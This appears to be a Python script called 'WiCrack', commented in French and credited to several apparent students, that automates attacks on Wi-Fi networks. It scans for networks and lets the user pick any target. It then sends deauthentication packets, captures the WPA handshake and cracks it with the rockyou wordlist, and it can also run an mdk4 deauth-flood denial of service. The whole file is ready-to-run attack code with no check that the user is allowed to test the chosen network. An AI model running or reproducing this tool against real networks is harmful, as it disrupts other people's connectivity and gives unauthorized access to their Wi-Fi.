#!/usr/bin/env python3
import os
import subprocess
import sys
import threading
import time
import logging
from datetime import datetime
from shutil import which
import importlib.metadata

# --- Vérification initiale des dépendances Python ---
REQUIRED_PIP_PACKAGES = ['questionary', 'pyfiglet']
missing_pip = []
for package in REQUIRED_PIP_PACKAGES:
    try:
        importlib.metadata.version(package)
    except importlib.metadata.PackageNotFoundError:
        missing_pip.append(package)

if missing_pip:
    print(f"[!] Dépendances Python manquantes : {', '.join(missing_pip)}")
    print("    Le script doit être lancé en tant que root pour les installer.")
    cmd = f"sudo {sys.executable} -m pip install {' '.join(missing_pip)}"
    print(f"[~] Exécution : {cmd}")
    try:
        subprocess.check_call(cmd, shell=True)
        print("\n[+] Dépendances installées. Veuillez relancer le script.")
        print(f"    sudo python3 {sys.argv[0]}")
    except subprocess.CalledProcessError:
        print("\n[!] Échec de l'installation pip. Veuillez les installer manuellement.")
        print(f"    sudo pip3 install {' '.join(missing_pip)}")
    sys.exit(0)

# --- Imports dépendants (maintenant sécurisés) ---
import questionary
from pyfiglet import figlet_format
import tkinter as tk
from tkinter import filedialog, messagebox

# ====== CONFIGURATION ======
WORK_DIR = "wicrack_output"

# Liste des binaires requis (simplifiée)
REQUIRED_TOOLS_BINARIES = [
    "airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng", "mdk4"
]

# Mapper les binaires aux noms de paquets APT de Kali (simplifié)
PACKAGE_MAP = {
    "airmon-ng": "aircrack-ng",
    "airodump-ng": "aircrack-ng",
    "aireplay-ng": "aircrack-ng",
    "aircrack-ng": "aircrack-ng",
    "mdk4": "mdk4",
}

# ====== DÉCLARATION DES FONCTIONS ======

def check_root():
    """Vérifie si le script est exécuté en tant que root."""
    if os.geteuid() != 0:
        print("\033[91m[!] Erreur : Ce script doit être exécuté en tant que root.\033[0m")
        print(f"    Veuillez utiliser : sudo python3 {sys.argv[0]}")
        sys.exit(1)

def check_system_deps():
    """Vérifie les outils système et propose de les installer."""
    print("[~] Vérification des outils système (APT)...")
    missing_bins = [tool for tool in REQUIRED_TOOLS_BINARIES if which(tool) is None]

    try:
        tk.Tk().withdraw()
    except tk.TclError:
        missing_bins.append("tkinter")

    if not missing_bins:
        print("\033[92m[+] Tous les outils système sont présents.\033[0m")
        return

    packages_to_install = set()
    for bin_name in missing_bins:
        if bin_name == "tkinter":
            packages_to_install.add("python3-tk")
        elif bin_name in PACKAGE_MAP:
            packages_to_install.add(PACKAGE_MAP[bin_name])

    if packages_to_install:
        print("\033[93m[!] Paquets système requis manquants : " + ", ".join(packages_to_install) + "\033[0m")
        if questionary.confirm("Voulez-vous tenter de les installer maintenant (via APT) ?").ask():
            cmd = f"sudo apt update && sudo apt install -y {' '.join(packages_to_install)}"
            print(f"[~] Exécution : {cmd}")
            return_code = subprocess.call(cmd, shell=True)
            if return_code != 0:
                print("\033[91m[!] L'installation a échoué. Veuillez les installer manuellement.\033[0m")
                sys.exit(1)
            print("\033[92m[+] Paquets système installés.\033[0m")
        else:
            print("\033[91m[!] Installation annulée. Le script ne peut pas continuer.\033[0m")
            sys.exit(1)

# ====== UTILITIES ======
def show_banner():
    print("\033[94m" + figlet_format("WiCrack", font="slant") + "\033[0m")
    print("\033[92mAn Interactive Wi-Fi Attack Automation Script\033[0m")
    print("\033[90mBy: Fadoua, Fatima Ezzahra, Aya et Melissa :)\033[0m\n")

def enter_monitor_mode():
    """Demande à l'utilisateur l'interface et la passe en mode moniteur."""
    interfaces = [i for i in os.listdir('/sys/class/net/') if i.startswith('wl') or i.startswith('wlx')]
    iface = ""
    if interfaces:
        iface_choice = questionary.select(
            "Quelle interface sans fil utiliser ?",
            choices=interfaces + ["Autre (spécifier manuellement)"]
        ).ask()
        if iface_choice == "Autre (spécifier manuellement)":
             iface = questionary.text("Entrez le nom de l'interface (ex: wlan0):").ask()
        else:
            iface = iface_choice
    else:
        iface = questionary.text("Entrez le nom de l'interface (ex: wlan0):").ask()
    
    if not iface:
        print("[!] Aucune interface sélectionnée. Arrêt.")
        sys.exit(1)
        
    print(f"[~] Passage de {iface} en mode moniteur...")
    subprocess.call(f"airmon-ng start {iface}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    iface_mon = iface + "mon" 
    if not os.path.exists(f'/sys/class/net/{iface_mon}'):
         iface_mon = iface
         print(f"[!] Interface {iface}mon non trouvée. Utilisation de {iface} en supposant qu'elle est en mode moniteur.")
    
    print(f"[+] Interface en mode moniteur : {iface_mon}")
    return iface_mon

def scan_networks(iface):
    """Lance airodump-ng et attend que l'utilisateur arrête avec Ctrl+C."""
    print("\033[96m[~] Scan des réseaux en cours...\033[0m")
    print("\033[93m    Appuyez sur [Ctrl+C] lorsque vous voyez votre cible (laissez tourner ~10s).\033[0m")
    output_file = os.path.join(WORK_DIR, "scan_output")
    
    for f in os.listdir(WORK_DIR):
        if f.startswith("scan_output-"):
            os.remove(os.path.join(WORK_DIR, f))
    
    cmd = f"airodump-ng {iface} -w {output_file} --output-format csv --write-interval 1"
    
    try:
        subprocess.call(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except KeyboardInterrupt:
        print("\n\033[92m[+] Scan arrêté par l'utilisateur.\033[0m")
    
    print("[~] Analyse des résultats...")
    
    csv_file = output_file + "-01.csv"
    if not os.path.exists(csv_file):
        print(f"[!] Fichier de scan {csv_file} non trouvé. Le scan a-t-il échoué ou a été arrêté trop tôt ?")
        sys.exit(1)
    return csv_file

def parse_csv(file):
    """Analyse le fichier CSV de airodump-ng pour trouver les réseaux."""
    networks = []
    try:
        with open(file, "r", encoding="utf-8", errors="ignore") as f:
            lines = f.readlines()
    except FileNotFoundError:
        print(f"[!] Erreur: Fichier {file} introuvable.")
        return []

    client_section = False
    for line in lines:
        if "Station MAC" in line:
            client_section = True
            break 
        if client_section or line.strip() == "":
            continue
        
        parts = [x.strip() for x in line.split(",")]
        if len(parts) >= 14:
            bssid = parts[0]
            channel = parts[3]
            essid = parts[13] 
            
            if bssid != "BSSID" and essid:
                networks.append({"BSSID": bssid, "Channel": channel, "ESSID": essid})
    return networks

def select_target(networks):
    """Affiche la liste des réseaux et demande à l'utilisateur de choisir."""
    choices = [f"{net['ESSID']} ({net['BSSID']})" for net in networks if net['ESSID']]
    if not choices:
        print("\033[91m[!] Aucun réseau (avec ESSID visible) n'a été détecté.\033[0m")
        print("    Veuillez relancer et scanner plus longtemps.")
        sys.exit(1)
        
    print("[+] Réseaux trouvés :")
    selected = questionary.select("Sélectionnez la cible :", choices=choices).ask()
    
    if not selected:
        print("[!] Aucune cible sélectionnée. Arrêt.")
        sys.exit(1)
        
    for net in networks:
        if net['ESSID'] in selected and net['BSSID'] in selected:
            return net

# ====== FONCTIONS D'ATTAQUE ======

def perform_handshake_attack(target, iface, output_prefix):
    """
    CORRIGÉ : Ajoute une pause de 10s après le deauth
    pour laisser le temps à l'écriture disque.
    """
    print("[~] Capture du handshake (Attaque de désauthentification)...")
    logging.info(f"Starting handshake attack on {target['BSSID']}")
    
    cap_file_base = output_prefix
    cap_file = f"{cap_file_base}-01.cap"

    # Nettoyer les anciens fichiers de capture pour cette cible
    target_prefix_name = target['ESSID'].replace(' ', '_').replace('/', '')
    for f in os.listdir(WORK_DIR):
        if f.startswith(target_prefix_name) and f.endswith((".cap", ".pcapng", ".csv", ".log", ".hccapx")):
             try:
                 os.remove(os.path.join(WORK_DIR, f))
             except OSError as e:
                 print(f"[!] Impossible de supprimer l'ancien fichier {f}: {e}")

    # --write-interval 1 est crucial pour forcer l'écriture disque
    airodump_cmd = f"airodump-ng --bssid {target['BSSID']} -c {target['Channel']} -w {cap_file_base} --write-interval 1 {iface}"
    aireplay_cmd = f"aireplay-ng --deauth 10 -a {target['BSSID']} {iface}"
    
    airo_proc = None
    handshake_captured = False
    
    try:
        print(f"[~] Lancement d'airodump (visible)...")
        airo_proc = subprocess.Popen(airodump_cmd, shell=True, stderr=subprocess.DEVNULL)
        
        print("[~] Attente de 3s avant la désauthentification...")
        time.sleep(3)
        
        print(f"[~] Lancement d'aireplay (broadcast) pour forcer un handshake...")
        subprocess.call(aireplay_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        print("\n\033[92m[~] Attaque de désauthentification envoyée.\033[0m")
        
        # --- DÉBUT DE LA CORRECTION ---
        print("[~] Attente de 10 secondes pour la capture et l'écriture disque...")
        time.sleep(10) # PAUSE AJOUTÉE
        # --- FIN DE LA CORRECTION ---
        
        print("[~] Surveillance de la capture pour un handshake... (Max 60s)")
        
        start_time = time.time()
        check_interval = 10 # Vérifie toutes les 10 secondes
        next_check = time.time() # Vérifie immédiatement la première fois
        
        while time.time() - start_time < 60: # Timeout de 60 secondes
            if time.time() < next_check:
                time.sleep(1)
                continue
            
            next_check += check_interval
            print("[~] Vérification du fichier .cap...")
            
            if not os.path.exists(cap_file):
                continue

            try:
                aircrack_check = subprocess.run(
                    f"aircrack-ng {cap_file}", 
                    shell=True, capture_output=True, text=True, timeout=10
                )
                
                output = aircrack_check.stdout + aircrack_check.stderr
                
                if "(1 handshake)" in output:
                    print("\033[92m[+] Handshake capturé automatiquement !\033[0m")
                    handshake_captured = True
                    break # Sortir de la boucle while
                else:
                    print("[~] Handshake non trouvé. Ré-envoi du deauth...")
                    subprocess.call(aireplay_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    
            except subprocess.TimeoutExpired:
                print("[!] Vérification aircrack-ng a expiré.")
        
        if not handshake_captured:
            print("\033[91m[!] Timeout. Aucun handshake capturé.\033[0m")
            
    except KeyboardInterrupt:
        print("\n[~] Arrêt manuel de la capture.")
    finally:
        if airo_proc:
            airo_proc.terminate()
            airo_proc.wait()
            print("[~] Capture airodump-ng terminée.")
            
    return handshake_captured # Retourne True si capturé, False sinon

def perform_dos_attack(target, iface):
    print(f"\033[91m[~] Lancement du DoS (deauth flood) sur {target['ESSID']}...\033[0m")
    print("    Appuyez sur Ctrl+C pour arrêter.")
    logging.info(f"Starting DoS attack on {target['BSSID']}")
    
    mdk4_cmd = f"mdk4 {iface} d -B {target['BSSID']} -c {target['Channel']}"
    try:
        subprocess.call(mdk4_cmd, shell=True)
    except KeyboardInterrupt:
        print("\n[~] Arrêt du DoS.")

def crack_password(capture_file_path):
    """
    Lance aircrack-ng automatiquement avec rockyou.txt
    et gère la décompression de .gz
    """
    print(f"[~] Tentative de crack avec /usr/share/wordlists/rockyou.txt...")
    wordlist = "/usr/share/wordlists/rockyou.txt"
    wordlist_gz = wordlist + ".gz"

    if not os.path.exists(wordlist) and os.path.exists(wordlist_gz):
        print(f"[~] Extraction de {wordlist_gz}...")
        try:
            subprocess.run(f"gzip -d -k {wordlist_gz}", shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print("[+] Wordlist extraite.")
        except Exception as e:
            print(f"[!] Échec de l'extraction de rockyou.txt.gz: {e}")
            return
            
    if not os.path.exists(wordlist):
        print(f"\033[91m[!] Wordlist non trouvée : {wordlist}\033[0m")
        print("    Veuillez l'installer avec : sudo apt install wordlists")
        return
        
    print(f"[~] Lancement du crack sur {capture_file_path}...")
    subprocess.call(f"aircrack-ng {capture_file_path} -w {wordlist}", shell=True)


def generate_report(target):
    """Génère un rapport simple en Markdown."""
    report_name = os.path.join(WORK_DIR, f"wicrack_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.md")
    with open(report_name, "w") as f:
        f.write(f"# WiCrack Report\n\n")
        f.write(f"## Target: {target['ESSID']} ({target['BSSID']})\n")
        f.write(f"- Channel: {target['Channel']}\n")
        f.write(f"- Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        f.write("## Fichiers de capture générés\n\n")
        
        captures = [f for f in os.listdir(WORK_DIR) if f.endswith((".cap", ".pcapng"))]
        if captures:
            for cap in captures:
                f.write(f"- `{cap}`\n")
        else:
            f.write("Aucun fichier de capture n'a été trouvé.\n")
            
    print(f"[+] Rapport généré : {report_name}")

# ===== MAIN FLOW =====
def main():
    clear = lambda: os.system('cls' if os.name == 'nt' else 'clear')
    clear()
    
    os.makedirs(WORK_DIR, exist_ok=True)
    logging.basicConfig(filename=os.path.join(WORK_DIR, 'wicrack.log'), level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
    
    show_banner()
    
    try:
        iface = enter_monitor_mode()
        csv_path = scan_networks(iface)
        networks = parse_csv(csv_path)
        
        target = select_target(networks) # Gère l'arrêt si networks est vide

        output_prefix = os.path.join(WORK_DIR, target['ESSID'].replace(' ', '_').replace('/', ''))

        attacks = questionary.checkbox(
            "Choisissez les attaques à effectuer (Espace pour sélectionner, Entrée pour valider):",
            choices=["Handshake", "Deauth Flood (DoS)"]
        ).ask()

        if not attacks:
            print("[!] Aucune attaque sélectionnée.")
            sys.exit(0)

        handshake_was_captured = False # Flag pour savoir si on doit cracker

        if "Deauth Flood (DoS)" in attacks:
            dos_thread = threading.Thread(target=perform_dos_attack, args=(target, iface))
            dos_thread.start()
            print("[~] Lancement du DoS en arrière-plan...")

        if "Handshake" in attacks:
            handshake_was_captured = perform_handshake_attack(target, iface, output_prefix)

        if "Deauth Flood (DoS)" in attacks and 'dos_thread' in locals():
            if not "Handshake" in attacks: 
                print("[~] Attaque DoS en cours. Appuyez sur Ctrl+C pour arrêter le script.")
            dos_thread.join() 

        if handshake_was_captured:
            target_prefix_name = target['ESSID'].replace(' ', '_').replace('/', '')
            cap_files = [os.path.join(WORK_DIR, f) for f in os.listdir(WORK_DIR) if f.endswith((".cap", ".pcapng")) and f.startswith(target_prefix_name)]
            
            if cap_files:
                latest_cap_file = max(cap_files, key=os.path.getmtime)
                print(f"\n[+] Fichier de capture trouvé : {latest_cap_file}")
                
                print("\033[92m[+] Lancement automatique du crack avec rockyou.txt...\033[0m")
                crack_password(latest_cap_file)
            
            else:
                print("\n\033[91m[!] Aucun fichier de capture (.cap) n'a été trouvé.\033[0m")
        
        elif "Handshake" in attacks and not handshake_was_captured:
             print("\n[~] Le crack est ignoré car le handshake n'a pas été capturé.")

        generate_report(target)
        print("\n[✔] Opération WiCrack terminée.")
        
    except (KeyboardInterrupt, questionary.exceptions.UserCancelled): 
        print("\n\033[91m[!] Opération annulée par l'utilisateur.\033[0m")
        sys.exit(0)
    except Exception as e:
        print(f"\n\033[91m[!] Une erreur inattendue est survenue : {e}\033[0m")
        logging.error(f"Erreur principale inattendue : {e}", exc_info=True)
        sys.exit(1)


if __name__ == "__main__":
    check_root()       # Vérifie les droits root
    check_system_deps()  # Vérifie et installe les paquets APT
    main()
